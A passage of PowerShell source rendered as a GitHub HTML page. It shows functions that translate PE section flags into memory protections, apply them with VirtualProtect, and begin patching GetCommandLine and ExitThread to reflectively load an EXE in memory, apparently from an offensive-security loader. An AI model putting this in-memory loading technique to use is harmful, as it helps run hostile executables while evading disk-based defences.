          <td id="LC1923" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">else</span></td>
        </tr>
        <tr>
          <td id="L1924" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1924"></td>
          <td id="LC1924" class="blob-code blob-code-inner js-file-line">				{</td>
        </tr>
        <tr>
          <td id="L1925" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1925"></td>
          <td id="LC1925" class="blob-code blob-code-inner js-file-line">					<span class="pl-smi">$ProtectionFlag</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.PAGE_EXECUTE_READ</span></span></td>
        </tr>
        <tr>
          <td id="L1926" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1926"></td>
          <td id="LC1926" class="blob-code blob-code-inner js-file-line">				}</td>
        </tr>
        <tr>
          <td id="L1927" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1927"></td>
          <td id="LC1927" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L1928" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1928"></td>
          <td id="LC1928" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">else</span></td>
        </tr>
        <tr>
          <td id="L1929" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1929"></td>
          <td id="LC1929" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L1930" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1930"></td>
          <td id="LC1930" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">if</span> ((<span class="pl-smi">$SectionCharacteristics</span> <span class="pl-k">-band</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.IMAGE_SCN_MEM_WRITE</span></span>) <span class="pl-k">-gt</span> <span class="pl-c1">0</span>)</td>
        </tr>
        <tr>
          <td id="L1931" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1931"></td>
          <td id="LC1931" class="blob-code blob-code-inner js-file-line">				{</td>
        </tr>
        <tr>
          <td id="L1932" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1932"></td>
          <td id="LC1932" class="blob-code blob-code-inner js-file-line">					<span class="pl-smi">$ProtectionFlag</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.PAGE_EXECUTE_WRITECOPY</span></span></td>
        </tr>
        <tr>
          <td id="L1933" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1933"></td>
          <td id="LC1933" class="blob-code blob-code-inner js-file-line">				}</td>
        </tr>
        <tr>
          <td id="L1934" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1934"></td>
          <td id="LC1934" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">else</span></td>
        </tr>
        <tr>
          <td id="L1935" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1935"></td>
          <td id="LC1935" class="blob-code blob-code-inner js-file-line">				{</td>
        </tr>
        <tr>
          <td id="L1936" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1936"></td>
          <td id="LC1936" class="blob-code blob-code-inner js-file-line">					<span class="pl-smi">$ProtectionFlag</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.PAGE_EXECUTE</span></span></td>
        </tr>
        <tr>
          <td id="L1937" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1937"></td>
          <td id="LC1937" class="blob-code blob-code-inner js-file-line">				}</td>
        </tr>
        <tr>
          <td id="L1938" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1938"></td>
          <td id="LC1938" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L1939" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1939"></td>
          <td id="LC1939" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L1940" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1940"></td>
          <td id="LC1940" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">else</span></td>
        </tr>
        <tr>
          <td id="L1941" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1941"></td>
          <td id="LC1941" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L1942" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1942"></td>
          <td id="LC1942" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">if</span> ((<span class="pl-smi">$SectionCharacteristics</span> <span class="pl-k">-band</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.IMAGE_SCN_MEM_READ</span></span>) <span class="pl-k">-gt</span> <span class="pl-c1">0</span>)</td>
        </tr>
        <tr>
          <td id="L1943" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1943"></td>
          <td id="LC1943" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L1944" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1944"></td>
          <td id="LC1944" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">if</span> ((<span class="pl-smi">$SectionCharacteristics</span> <span class="pl-k">-band</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.IMAGE_SCN_MEM_WRITE</span></span>) <span class="pl-k">-gt</span> <span class="pl-c1">0</span>)</td>
        </tr>
        <tr>
          <td id="L1945" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1945"></td>
          <td id="LC1945" class="blob-code blob-code-inner js-file-line">				{</td>
        </tr>
        <tr>
          <td id="L1946" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1946"></td>
          <td id="LC1946" class="blob-code blob-code-inner js-file-line">					<span class="pl-smi">$ProtectionFlag</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.PAGE_READWRITE</span></span></td>
        </tr>
        <tr>
          <td id="L1947" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1947"></td>
          <td id="LC1947" class="blob-code blob-code-inner js-file-line">				}</td>
        </tr>
        <tr>
          <td id="L1948" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1948"></td>
          <td id="LC1948" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">else</span></td>
        </tr>
        <tr>
          <td id="L1949" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1949"></td>
          <td id="LC1949" class="blob-code blob-code-inner js-file-line">				{</td>
        </tr>
        <tr>
          <td id="L1950" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1950"></td>
          <td id="LC1950" class="blob-code blob-code-inner js-file-line">					<span class="pl-smi">$ProtectionFlag</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.PAGE_READONLY</span></span></td>
        </tr>
        <tr>
          <td id="L1951" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1951"></td>
          <td id="LC1951" class="blob-code blob-code-inner js-file-line">				}</td>
        </tr>
        <tr>
          <td id="L1952" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1952"></td>
          <td id="LC1952" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L1953" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1953"></td>
          <td id="LC1953" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">else</span></td>
        </tr>
        <tr>
          <td id="L1954" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1954"></td>
          <td id="LC1954" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L1955" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1955"></td>
          <td id="LC1955" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">if</span> ((<span class="pl-smi">$SectionCharacteristics</span> <span class="pl-k">-band</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.IMAGE_SCN_MEM_WRITE</span></span>) <span class="pl-k">-gt</span> <span class="pl-c1">0</span>)</td>
        </tr>
        <tr>
          <td id="L1956" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1956"></td>
          <td id="LC1956" class="blob-code blob-code-inner js-file-line">				{</td>
        </tr>
        <tr>
          <td id="L1957" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1957"></td>
          <td id="LC1957" class="blob-code blob-code-inner js-file-line">					<span class="pl-smi">$ProtectionFlag</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.PAGE_WRITECOPY</span></span></td>
        </tr>
        <tr>
          <td id="L1958" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1958"></td>
          <td id="LC1958" class="blob-code blob-code-inner js-file-line">				}</td>
        </tr>
        <tr>
          <td id="L1959" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1959"></td>
          <td id="LC1959" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">else</span></td>
        </tr>
        <tr>
          <td id="L1960" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1960"></td>
          <td id="LC1960" class="blob-code blob-code-inner js-file-line">				{</td>
        </tr>
        <tr>
          <td id="L1961" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1961"></td>
          <td id="LC1961" class="blob-code blob-code-inner js-file-line">					<span class="pl-smi">$ProtectionFlag</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.PAGE_NOACCESS</span></span></td>
        </tr>
        <tr>
          <td id="L1962" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1962"></td>
          <td id="LC1962" class="blob-code blob-code-inner js-file-line">				}</td>
        </tr>
        <tr>
          <td id="L1963" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1963"></td>
          <td id="LC1963" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L1964" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1964"></td>
          <td id="LC1964" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L1965" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1965"></td>
          <td id="LC1965" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1966" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1966"></td>
          <td id="LC1966" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> ((<span class="pl-smi">$SectionCharacteristics</span> <span class="pl-k">-band</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.IMAGE_SCN_MEM_NOT_CACHED</span></span>) <span class="pl-k">-gt</span> <span class="pl-c1">0</span>)</td>
        </tr>
        <tr>
          <td id="L1967" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1967"></td>
          <td id="LC1967" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L1968" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1968"></td>
          <td id="LC1968" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$ProtectionFlag</span> <span class="pl-k">=</span> <span class="pl-smi">$ProtectionFlag</span> <span class="pl-k">-bor</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.PAGE_NOCACHE</span></span></td>
        </tr>
        <tr>
          <td id="L1969" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1969"></td>
          <td id="LC1969" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L1970" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1970"></td>
          <td id="LC1970" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1971" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1971"></td>
          <td id="LC1971" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">return</span> <span class="pl-smi">$ProtectionFlag</span></td>
        </tr>
        <tr>
          <td id="L1972" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1972"></td>
          <td id="LC1972" class="blob-code blob-code-inner js-file-line">	}</td>
        </tr>
        <tr>
          <td id="L1973" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1973"></td>
          <td id="LC1973" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L1974" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1974"></td>
          <td id="LC1974" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">Function</span> <span class="pl-en">Update-MemoryProtectionFlags</span></td>
        </tr>
        <tr>
          <td id="L1975" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1975"></td>
          <td id="LC1975" class="blob-code blob-code-inner js-file-line">	{</td>
        </tr>
        <tr>
          <td id="L1976" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1976"></td>
          <td id="LC1976" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">Param</span>(</td>
        </tr>
        <tr>
          <td id="L1977" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1977"></td>
          <td id="LC1977" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">0</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L1978" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1978"></td>
          <td id="LC1978" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">System.Object</span>]</td>
        </tr>
        <tr>
          <td id="L1979" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1979"></td>
          <td id="LC1979" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$PEInfo</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L1980" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1980"></td>
          <td id="LC1980" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1981" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1981"></td>
          <td id="LC1981" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">1</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L1982" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1982"></td>
          <td id="LC1982" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">System.Object</span>]</td>
        </tr>
        <tr>
          <td id="L1983" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1983"></td>
          <td id="LC1983" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Functions</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L1984" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1984"></td>
          <td id="LC1984" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1985" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1985"></td>
          <td id="LC1985" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">2</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L1986" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1986"></td>
          <td id="LC1986" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">System.Object</span>]</td>
        </tr>
        <tr>
          <td id="L1987" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1987"></td>
          <td id="LC1987" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Constants</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L1988" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1988"></td>
          <td id="LC1988" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1989" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1989"></td>
          <td id="LC1989" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">3</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L1990" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1990"></td>
          <td id="LC1990" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">System.Object</span>]</td>
        </tr>
        <tr>
          <td id="L1991" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1991"></td>
          <td id="LC1991" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Types</span></td>
        </tr>
        <tr>
          <td id="L1992" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1992"></td>
          <td id="LC1992" class="blob-code blob-code-inner js-file-line">		)</td>
        </tr>
        <tr>
          <td id="L1993" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1993"></td>
          <td id="LC1993" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1994" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1994"></td>
          <td id="LC1994" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">for</span>( <span class="pl-smi">$i</span> <span class="pl-k">=</span> <span class="pl-c1">0</span>; <span class="pl-smi">$i</span> <span class="pl-k">-lt</span> <span class="pl-smi">$PEInfo<span class="pl-smi">.IMAGE_NT_HEADERS.FileHeader.NumberOfSections</span></span>; <span class="pl-smi">$i</span><span class="pl-k">++</span>)</td>
        </tr>
        <tr>
          <td id="L1995" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1995"></td>
          <td id="LC1995" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L1996" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1996"></td>
          <td id="LC1996" class="blob-code blob-code-inner js-file-line">			[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$SectionHeaderPtr</span> <span class="pl-k">=</span> [<span class="pl-k">IntPtr</span>](<span class="pl-c1">Add-SignedIntAsUnsigned</span> ([<span class="pl-k">Int64</span>]<span class="pl-smi">$PEInfo<span class="pl-smi">.SectionHeaderPtr</span></span>) (<span class="pl-smi">$i</span> <span class="pl-k">*</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::SizeOf([<span class="pl-k">Type</span>]<span class="pl-smi">$Win32Types<span class="pl-smi">.IMAGE_SECTION_HEADER</span></span>)))</td>
        </tr>
        <tr>
          <td id="L1997" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1997"></td>
          <td id="LC1997" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$SectionHeader</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::PtrToStructure(<span class="pl-smi">$SectionHeaderPtr</span><span class="pl-k">,</span> [<span class="pl-k">Type</span>]<span class="pl-smi">$Win32Types<span class="pl-smi">.IMAGE_SECTION_HEADER</span></span>)</td>
        </tr>
        <tr>
          <td id="L1998" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1998"></td>
          <td id="LC1998" class="blob-code blob-code-inner js-file-line">			[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$SectionPtr</span> <span class="pl-k">=</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> (<span class="pl-smi">$PEInfo<span class="pl-smi">.PEHandle</span></span>) (<span class="pl-smi">$SectionHeader<span class="pl-smi">.VirtualAddress</span></span>)</td>
        </tr>
        <tr>
          <td id="L1999" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1999"></td>
          <td id="LC1999" class="blob-code blob-code-inner js-file-line">			</td>
        </tr>
        <tr>
          <td id="L2000" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2000"></td>
          <td id="LC2000" class="blob-code blob-code-inner js-file-line">			[<span class="pl-k">UInt32</span>]<span class="pl-smi">$ProtectFlag</span> <span class="pl-k">=</span> <span class="pl-c1">Get-VirtualProtectValue</span> <span class="pl-smi">$SectionHeader<span class="pl-smi">.Characteristics</span></span></td>
        </tr>
        <tr>
          <td id="L2001" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2001"></td>
          <td id="LC2001" class="blob-code blob-code-inner js-file-line">			[<span class="pl-k">UInt32</span>]<span class="pl-smi">$SectionSize</span> <span class="pl-k">=</span> <span class="pl-smi">$SectionHeader<span class="pl-smi">.VirtualSize</span></span></td>
        </tr>
        <tr>
          <td id="L2002" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2002"></td>
          <td id="LC2002" class="blob-code blob-code-inner js-file-line">			</td>
        </tr>
        <tr>
          <td id="L2003" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2003"></td>
          <td id="LC2003" class="blob-code blob-code-inner js-file-line">			[<span class="pl-k">UInt32</span>]<span class="pl-smi">$OldProtectFlag</span> <span class="pl-k">=</span> <span class="pl-c1">0</span></td>
        </tr>
        <tr>
          <td id="L2004" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2004"></td>
          <td id="LC2004" class="blob-code blob-code-inner js-file-line">			<span class="pl-c1">Test-MemoryRangeValid</span> <span class="pl-k">-</span>DebugString <span class="pl-s"><span class="pl-pds">&quot;</span>Update-MemoryProtectionFlags::VirtualProtect<span class="pl-pds">&quot;</span></span> <span class="pl-k">-</span>PEInfo <span class="pl-smi">$PEInfo</span> <span class="pl-k">-</span>StartAddress <span class="pl-smi">$SectionPtr</span> <span class="pl-k">-</span>Size <span class="pl-smi">$SectionSize</span> <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L2005" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2005"></td>
          <td id="LC2005" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$Success</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.VirtualProtect.Invoke</span></span>(<span class="pl-smi">$SectionPtr</span><span class="pl-k">,</span> <span class="pl-smi">$SectionSize</span><span class="pl-k">,</span> <span class="pl-smi">$ProtectFlag</span><span class="pl-k">,</span> [<span class="pl-k">Ref</span>]<span class="pl-smi">$OldProtectFlag</span>)</td>
        </tr>
        <tr>
          <td id="L2006" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2006"></td>
          <td id="LC2006" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">if</span> (<span class="pl-smi">$Success</span> <span class="pl-k">-eq</span> <span class="pl-c1">$false</span>)</td>
        </tr>
        <tr>
          <td id="L2007" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2007"></td>
          <td id="LC2007" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L2008" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2008"></td>
          <td id="LC2008" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Unable to change memory protection<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2009" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2009"></td>
          <td id="LC2009" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L2010" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2010"></td>
          <td id="LC2010" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L2011" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2011"></td>
          <td id="LC2011" class="blob-code blob-code-inner js-file-line">	}</td>
        </tr>
        <tr>
          <td id="L2012" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2012"></td>
          <td id="LC2012" class="blob-code blob-code-inner js-file-line">	</td>
        </tr>
        <tr>
          <td id="L2013" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2013"></td>
          <td id="LC2013" class="blob-code blob-code-inner js-file-line">	<span class="pl-c"><span class="pl-c">#</span>This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE</span></td>
        </tr>
        <tr>
          <td id="L2014" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2014"></td>
          <td id="LC2014" class="blob-code blob-code-inner js-file-line">	<span class="pl-c"><span class="pl-c">#</span>Returns an object with addresses to copies of the bytes that were overwritten (and the count)</span></td>
        </tr>
        <tr>
          <td id="L2015" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2015"></td>
          <td id="LC2015" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">Function</span> <span class="pl-en">Update-ExeFunctions</span></td>
        </tr>
        <tr>
          <td id="L2016" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2016"></td>
          <td id="LC2016" class="blob-code blob-code-inner js-file-line">	{</td>
        </tr>
        <tr>
          <td id="L2017" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2017"></td>
          <td id="LC2017" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">Param</span>(</td>
        </tr>
        <tr>
          <td id="L2018" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2018"></td>
          <td id="LC2018" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">0</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L2019" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2019"></td>
          <td id="LC2019" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">System.Object</span>]</td>
        </tr>
        <tr>
          <td id="L2020" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2020"></td>
          <td id="LC2020" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$PEInfo</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L2021" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2021"></td>
          <td id="LC2021" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2022" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2022"></td>
          <td id="LC2022" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">1</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L2023" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2023"></td>
          <td id="LC2023" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">System.Object</span>]</td>
        </tr>
        <tr>
          <td id="L2024" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2024"></td>
          <td id="LC2024" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Functions</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L2025" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2025"></td>
          <td id="LC2025" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2026" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2026"></td>
          <td id="LC2026" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">2</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L2027" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2027"></td>
          <td id="LC2027" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">System.Object</span>]</td>
        </tr>
        <tr>
          <td id="L2028" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2028"></td>
          <td id="LC2028" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Constants</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L2029" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2029"></td>
          <td id="LC2029" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
